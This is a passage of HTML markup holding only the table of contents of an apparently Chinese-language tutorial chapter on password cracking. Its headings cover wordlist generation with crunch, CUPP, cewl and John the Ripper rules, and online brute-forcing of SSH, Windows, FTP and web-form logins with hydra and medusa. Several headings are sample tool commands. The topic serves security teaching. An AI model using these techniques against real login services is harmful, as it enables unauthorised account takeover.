class="toc-number">22.1.1.</span> <span class="toc-text">目标系统实施了强安全措施</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%AE%89%E8%A3%85%E4%BA%86%E6%89%80%E6%9C%89%E8%A1%A5%E4%B8%81"><span class="toc-number">22.1.1.0.1.</span> <span class="toc-text">– 安装了所有补丁</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%97%A0%E4%BB%BB%E4%BD%95%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">22.1.1.0.2.</span> <span class="toc-text">– 无任何已知漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%97%A0%E5%BA%94%E7%94%A8%E5%B1%82%E6%BC%8F%E6%B4%9E"><span class="toc-number">22.1.1.0.3.</span> <span class="toc-text">– 无应用层漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%94%BB%E5%87%BB%E9%9D%A2%E6%9C%80%E5%B0%8F%E5%8C%96"><span class="toc-number">22.1.1.0.4.</span> <span class="toc-text">– 攻击面最小化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6"><span class="toc-number">22.1.2.</span> <span class="toc-text">社会工程学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD"><span class="toc-number">22.1.3.</span> <span class="toc-text">获取目标系统用户身份</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E9%9D%9E%E6%8E%88%E6%9D%83%E7%94%A8%E6%88%B7%E4%B8%8D%E5%8F%97%E4%BF%A1%EF%BC%8C%E8%AE%A4%E8%AF%81%E7%94%A8%E6%88%B7%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E5%AE%88%E4%BF%A1%E8%B5%84%E6%BA%90"><span class="toc-number">22.1.3.0.1.</span> <span class="toc-text">– 非授权用户不受信，认证用户可以访问守信资源</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%B7%B2%E6%9C%89%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7%E6%9D%83%E9%99%90%E5%8F%97%E9%99%90%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8F%90%E6%9D%83"><span class="toc-number">22.1.3.0.2.</span> <span class="toc-text">– 已有用户账号权限受限，需要提权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E4%B8%8D%E4%BC%9A%E8%A7%A6%E5%8F%91%E7%B3%BB%E7%BB%9F%E6%8A%A5%E8%AD%A6"><span class="toc-number">22.1.3.0.3.</span> <span class="toc-text">– 不会触发系统报警</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%96%B9%E6%B3%95"><span class="toc-number">22.2.</span> <span class="toc-text">身份认证方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%81%E6%98%8E%E4%BD%A0%E6%98%AF%E4%BD%A0%E5%A3%B0%E7%A7%B0%E4%BD%A0%E6%98%AF%E7%9A%84%E9%82%A3%E4%B8%AA%E4%BA%BA"><span class="toc-number">22.2.1.</span> <span class="toc-text">证明你是你声称你是的那个人</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E4%BA%92%E8%81%94%E7%BD%91%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%BB%8D%E4%BB%A5%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%B8%BA%E4%B8%BB%E8%A6%81%E5%BD%A2%E5%BC%8F"><span class="toc-number">22.2.2.</span> <span class="toc-text">基于互联网的身份验证仍以账号密码为主要形式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95"><span class="toc-number">22.3.</span> <span class="toc-text">密码破解方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%BA%E5%B7%A5%E7%8C%9C%E8%A7%A3"><span class="toc-number">22.3.1.</span> <span class="toc-text">人工猜解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%9E%83%E5%9C%BE%E6%A1%B6%E5%B7%A5%E7%A8%8B"><span class="toc-number">22.3.1.0.1.</span> <span class="toc-text">– 垃圾桶工程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">22.3.1.0.2.</span> <span class="toc-text">– 被动信息收集</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%AD%97%E5%85%B8%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%88%E4%B8%BB%E6%B5%81%EF%BC%89"><span class="toc-number">22.3.2.</span> <span class="toc-text">基于字典暴力破解（主流）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E7%A9%BA%E9%97%B4%E5%AD%97%E7%AC%A6%E6%9A%B4%E7%A0%B4"><span class="toc-number">22.3.3.</span> <span class="toc-text">键盘空间字符暴破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E5%85%B8"><span class="toc-number">22.3.4.</span> <span class="toc-text">字典</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E4%BF%9D%E5%AD%98%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E7%9A%84%E6%96%87%E6%9C%AC%E6%96%87%E4%BB%B6"><span class="toc-number">22.3.4.0.1.</span> <span class="toc-text">– 保存有用户名和密码的文本文件</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8-1"><span class="toc-number">22.4.</span> <span class="toc-text">字典</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E7%A9%BA%E9%97%B4%E5%AD%97%E7%AC%A6%E7%88%86%E7%A0%B4"><span class="toc-number">22.4.1.</span> <span class="toc-text">键盘空间字符爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%85%A8%E9%94%AE%E7%9B%98%E7%A9%BA%E9%97%B4%E5%AD%97%E7%AC%A6"><span class="toc-number">22.4.1.0.1.</span> <span class="toc-text">– 全键盘空间字符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E9%83%A8%E5%88%86%E9%94%AE%E7%9B%98%E7%A9%BA%E9%97%B4%E5%AD%97%E7%AC%A6-%E5%9F%BA%E4%BA%8E%E8%A7%84%E5%88%99"><span class="toc-number">22.4.1.0.2.</span> <span class="toc-text">– 部分键盘空间字符 (基于规则)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%95%B0%E5%AD%97%E3%80%81%E5%B0%8F%E5%86%99%E5%AD%97%E6%AF%8D%E3%80%81%E5%A4%A7%E5%86%99%E5%AD%97%E6%AF%8D%E3%80%81%E7%AC%A6%E5%8F%B7%E3%80%81%E7%A9%BA%E6%A0%BC%E3%80%81%E7%91%9E%E5%85%B8%E5%AD%97%E7%AC%A6%E3%80%81%E9%AB%98%E4%BD%8DASCII%E7%A0%81"><span class="toc-number">22.4.1.0.3.</span> <span class="toc-text">– 数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crunch-options"><span class="toc-number">22.4.2.</span> <span class="toc-text">crunch   [] [options]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crunch-6-6-0123456789-o-START-d-2-b-1mb-x2F-c-100"><span class="toc-number">22.4.3.</span> <span class="toc-text">crunch 6 6 0123456789 -o START -d 2 -b 1mb &#x2F; -c 100</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8-2"><span class="toc-number">22.5.</span> <span class="toc-text">字典</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E9%9B%86"><span class="toc-number">22.5.1.</span> <span class="toc-text">字符集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6"><span class="toc-number">22.5.2.</span> <span class="toc-text">无重复字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E4%B8%AD%E6%AF%8F%E8%A1%8C%E5%86%85%E5%AE%B9%E4%BD%9C%E4%B8%BA%E5%9F%BA%E6%9C%AC%E5%AD%97%E7%AC%A6%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8"><span class="toc-number">22.5.3.</span> <span class="toc-text">读取文件中每行内容作为基本字符生成字典</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8-3"><span class="toc-number">22.6.</span> <span class="toc-text">字典</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E5%85%B8%E7%BB%84%E6%88%90%E8%A7%84%E5%88%99"><span class="toc-number">22.6.1.</span> <span class="toc-text">字典组成规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9"><span class="toc-number">22.6.2.</span> <span class="toc-text">输出文件压缩</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8-4"><span class="toc-number">22.7.</span> <span class="toc-text">字典</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#crunch-4-4-f-x2F-usr-x2F-share-x2F-crunch-x2F-charset-lst-mixalpha"><span class="toc-number">22.7.1.</span> <span class="toc-text">crunch 4 4 -f &#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst mixalpha-</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#numeric-all-space-o-w-txt-t-d-s-cdab"><span class="toc-number">22.7.2.</span> <span class="toc-text">numeric-all-space -o w.txt -t @d@@ -s cdab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crunch-4-5-p-dog-cat-bird"><span class="toc-number">22.7.3.</span> <span class="toc-text">crunch 4 5 -p dog cat bird</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crunch-5-5-abc-DEF-t"><span class="toc-number">22.7.4.</span> <span class="toc-text">crunch 5 5 abc DEF + !@# -t ,@^%,</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%8D%A0%E4%BD%8D%E7%AC%A6"><span class="toc-number">22.7.4.0.1.</span> <span class="toc-text">– + 占位符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E8%BD%AC%E4%B9%89%E7%AC%A6%EF%BC%88%E7%A9%BA%E6%A0%BC%E3%80%81%E7%AC%A6%E5%8F%B7%EF%BC%89"><span class="toc-number">22.7.4.0.2.</span> <span class="toc-text">– \ 转义符（空格、符号）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crunch-5-5-t-ddd-p-dog-cat-bird"><span class="toc-number">22.7.5.</span> <span class="toc-text">crunch 5 5 -t ddd%% -p dog cat bird</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crunch-5-5-d-2-t"><span class="toc-number">22.7.6.</span> <span class="toc-text">crunch 5 5 -d 2@ -t @@@%%</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8-5"><span class="toc-number">22.8.</span> <span class="toc-text">字典</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E5%BA%94%E7%94%A8"><span class="toc-number">22.8.1.</span> <span class="toc-text">组合应用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8-6"><span class="toc-number">22.9.</span> <span class="toc-text">字典</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%89%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E7%94%9F%E6%88%90%E5%85%B6%E4%B8%93%E5%B1%9E%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8"><span class="toc-number">22.9.1.</span> <span class="toc-text">按个人信息生成其专属的密码字典</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CUPP%EF%BC%9ACommon-User-Password-Profiler"><span class="toc-number">22.9.2.</span> <span class="toc-text">CUPP：Common User Password Profiler</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8-7"><span class="toc-number">22.10.</span> <span class="toc-text">字典</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E7%94%9F%E6%88%90%E5%AD%97%E5%85%B8"><span class="toc-number">22.10.1.</span> <span class="toc-text">通过收集网站信息生成字典</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cewl-1-1-1-1-m-3-d-3-e-c-v-w-a-txt"><span class="toc-number">22.10.2.</span> <span class="toc-text">cewl 1.1.1.1 -m 3 -d 3 - e -c -v -w a.txt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8-8"><span class="toc-number">22.11.</span> <span class="toc-text">字典</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E5%8F%98%E5%9E%8B"><span class="toc-number">22.11.1.</span> <span class="toc-text">用户密码变型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8-9"><span class="toc-number">22.12.</span> <span class="toc-text">字典</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-John-the-Ripper-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E5%8A%A8%E6%80%81%E5%8F%98%E5%9E%8B"><span class="toc-number">22.12.1.</span> <span class="toc-text">使用 John the Ripper 配置文件实现密码动态变型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x2F-etc-x2F-john-x2F-john-conf"><span class="toc-number">22.12.2.</span> <span class="toc-text">&#x2F;etc&#x2F;john&#x2F;john.conf</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94hydra"><span class="toc-number">22.13.</span> <span class="toc-text">在线密码破解——hydra</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hydra"><span class="toc-number">22.13.1.</span> <span class="toc-text">Hydra</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E4%B9%9D%E5%A4%B4%E8%9B%87%EF%BC%8C%E7%A0%8D%E5%8E%BB%E4%B8%80%E4%B8%AA%E5%A4%B4%E5%8D%B3%E9%95%BF%E5%87%BA%E6%96%B0%E5%A4%B4%EF%BC%8C%E5%90%8E%E4%B8%BA%E5%A4%A7%E5%8A%9B%E7%A5%9E%E8%B5%AB%E6%8B%89%E5%85%8B%E5%8B%92%E6%96%AF%E6%89%80%E6%9D%80"><span class="toc-number">22.13.1.0.1.</span> <span class="toc-text">– 九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94hydra-1"><span class="toc-number">22.14.</span> <span class="toc-text">在线密码破解——hydra</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.14.1.</span> <span class="toc-text">Windows密码破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.14.2.</span> <span class="toc-text">Linux密码破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.14.3.</span> <span class="toc-text">其他服务密码破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2"><span class="toc-number">22.14.4.</span> <span class="toc-text">图形化界面</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94hydra-2"><span class="toc-number">22.15.</span> <span class="toc-text">在线密码破解——hydra</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%A1%A8%E5%8D%95%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-number">22.15.1.</span> <span class="toc-text">HTTP表单身份认证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94hydra-3"><span class="toc-number">22.16.</span> <span class="toc-text">在线密码破解——hydra</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pw-inspector"><span class="toc-number">22.16.1.</span> <span class="toc-text">pw-inspector</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%8C%89%E9%95%BF%E5%BA%A6%E5%92%8C%E5%AD%97%E7%AC%A6%E9%9B%86%E7%AD%9B%E9%80%89%E5%AD%97%E5%85%B8"><span class="toc-number">22.16.1.0.1.</span> <span class="toc-text">– 按长度和字符集筛选字典</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%95%88%E7%8E%87"><span class="toc-number">22.16.2.</span> <span class="toc-text">密码破解效率</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%AF%86%E7%A0%81%E5%A4%8D%E6%9D%82%E5%BA%A6%EF%BC%88%E5%AD%97%E5%85%B8%E5%91%BD%E4%B8%AD%E7%8E%87%EF%BC%89"><span class="toc-number">22.16.2.0.1.</span> <span class="toc-text">– 密码复杂度（字典命中率）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%B8%A6%E5%AE%BD%E3%80%81%E5%8D%8F%E8%AE%AE%E3%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%80%A7%E8%83%BD%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%80%A7%E8%83%BD"><span class="toc-number">22.16.2.0.2.</span> <span class="toc-text">– 带宽、协议、服务器性能、客户端性能</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E9%94%81%E5%AE%9A%E9%98%88%E5%80%BC"><span class="toc-number">22.16.2.0.3.</span> <span class="toc-text">– 锁定阈值</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%8D%95%E4%BD%8D%E6%97%B6%E9%97%B4%E6%9C%80%E5%A4%A7%E7%99%BB%E9%99%86%E8%AF%B7%E6%B1%82%E6%AC%A1%E6%95%B0"><span class="toc-number">22.16.2.0.4.</span> <span class="toc-text">– 单位时间最大登陆请求次数</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94medusa"><span class="toc-number">22.17.</span> <span class="toc-text">在线密码破解——medusa</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hydra-%E7%9A%84%E7%BC%BA%E7%82%B9"><span class="toc-number">22.17.1.</span> <span class="toc-text">Hydra 的缺点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E7%A8%B3%E5%AE%9A%E6%80%A7%E5%B7%AE%EF%BC%8C%E7%A8%8B%E5%BA%8F%E6%97%B6%E5%B8%B8%E5%B4%A9%E6%BA%83"><span class="toc-number">22.17.1.0.1.</span> <span class="toc-text">– 稳定性差，程序时常崩溃</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E9%80%9F%E5%BA%A6%E6%8E%A7%E5%88%B6%E4%B8%8D%E5%A5%BD%EF%BC%8C%E5%AE%B9%E6%98%93%E8%A7%A6%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%B1%8F%E8%94%BD%E6%88%96%E9%94%81%E6%AD%BB%E6%9C%BA%E5%88%B6"><span class="toc-number">22.17.1.0.2.</span> <span class="toc-text">– 速度控制不好，容易触发服务屏蔽或锁死机制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%AF%8F%E4%B8%BB%E6%9C%BA%E6%96%B0%E5%BB%BA%E8%BF%9B%E7%A8%8B%EF%BC%8C%E6%AF%8F%E6%9C%8D%E5%8A%A1%E6%96%B0%E5%BB%BA%E5%AE%9E%E4%BE%8B"><span class="toc-number">22.17.1.0.3.</span> <span class="toc-text">– 每主机新建进程，每服务新建实例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%A4%A7%E9%87%8F%E7%9B%AE%E6%A0%87%E7%A0%B4%E8%A7%A3%E6%97%B6%E6%80%A7%E8%83%BD%E5%B7%AE"><span class="toc-number">22.17.1.0.4.</span> <span class="toc-text">– 大量目标破解时性能差</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medusa-%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">22.17.2.</span> <span class="toc-text">Medusa 的特点</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E7%A8%B3%E5%AE%9A%E6%80%A7%E5%A5%BD"><span class="toc-number">22.17.2.0.1.</span> <span class="toc-text">– 稳定性好</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E9%80%9F%E5%BA%A6%E6%8E%A7%E5%88%B6%E5%BE%97%E5%BD%93"><span class="toc-number">22.17.2.0.2.</span> <span class="toc-text">– 速度控制得当</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%9F%BA%E4%BA%8E%E7%BA%BF%E7%A8%8B"><span class="toc-number">22.17.2.0.3.</span> <span class="toc-text">– 基于线程</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94medusa-1"><span class="toc-number">22.18.</span> <span class="toc-text">在线密码破解——medusa</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#medusa-d"><span class="toc-number">22.18.1.</span> <span class="toc-text">medusa -d</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3windows%E5%AF%86%E7%A0%81"><span class="toc-number">22.18.2.</span> <span class="toc-text">破解windows密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3Linux-SSH%E5%AF%86%E7%A0%81"><span class="toc-number">22.18.3.</span> <span class="toc-text">破解Linux SSH密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%9C%8D%E5%8A%A1%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-1"><span class="toc-number">22.18.4.</span> <span class="toc-text">其他服务密码破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E2%80%94%E2%80%94medusa-2"><span class="toc-number">22.19.</span> <span class="toc-text">在线密码破解——medusa</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#n%EF%BC%9A%E9%9D%9E%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-number">22.19.1.</span> <span class="toc-text">-n：非默认端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s%EF%BC%9A%E4%BD%BF%E7%94%A8SSL%E8%BF%9E%E6%8E%A5"><span class="toc-number">22.19.2.</span> <span class="toc-text">-s：使用SSL连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#T%EF%BC%9A%E5%B9%B6%E5%8F%91%E4%B8%BB%E6%9C%BA%E6%95%B0"><span class="toc-number">22.19.3.</span> <span class="toc-text">-T：并发主机数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medusa-M-ftp-q"><span class="toc-number">22.19.4.</span> <span class="toc-text">medusa -M ftp -q</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">22.20.</span> <span class="toc-text">离线密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-number">22.20.1.</span> <span class="toc-text">身份认证</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E7%A6%81%E6%AD%A2%E6%98%8E%E6%96%87%E4%BC%A0%E8%BE%93%E5%AF%86%E7%A0%81"><span class="toc-number">22.20.1.0.1.</span> <span class="toc-text">– 禁止明文传输密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%AF%8F%E6%AC%A1%E8%AE%A4%E8%AF%81%E4%BD%BF%E7%94%A8HASH%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86%E5%AF%86%E7%A0%81%E4%BC%A0%E8%BE%93%EF%BC%88HASH%E7%AE%97%E6%B3%95%E5%8A%A0%E5%AF%86%E5%AE%B9%E6%98%93%E3%80%81%E8%A7%A3%E5%AF%86%E5%9B%B0%E9%9A%BE%EF%BC%89"><span class="toc-number">22.20.1.0.2.</span> <span class="toc-text">– 每次认证使用HASH算法加密密码传输（HASH算法加密容易、解密困难）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E5%8A%A0%E7%9B%90%E5%8A%A0%E5%AF%86%E4%BF%9D%E5%AD%98"><span class="toc-number">22.20.1.0.3.</span> <span class="toc-text">– 服务器端用户数据库应加盐加密保存</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E6%80%9D%E8%B7%AF"><span class="toc-number">22.20.2.</span> <span class="toc-text">破解思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%97%85%E6%8E%A2%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81HASH"><span class="toc-number">22.20.2.0.1.</span> <span class="toc-text">– 嗅探获取密码HASH</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E7%99%BB%E9%99%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B9%B6%E4%BB%8E%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81HASH"><span class="toc-number">22.20.2.0.2.</span> <span class="toc-text">– 利用漏洞登陆服务器并从用户数据库获取密码HASH</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%93-%E8%AF%86%E5%88%ABHASH%E7%B1%BB%E5%9E%8B"><span class="toc-number">22.20.2.0.3.</span> <span class="toc-text">– 识别HASH类型</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 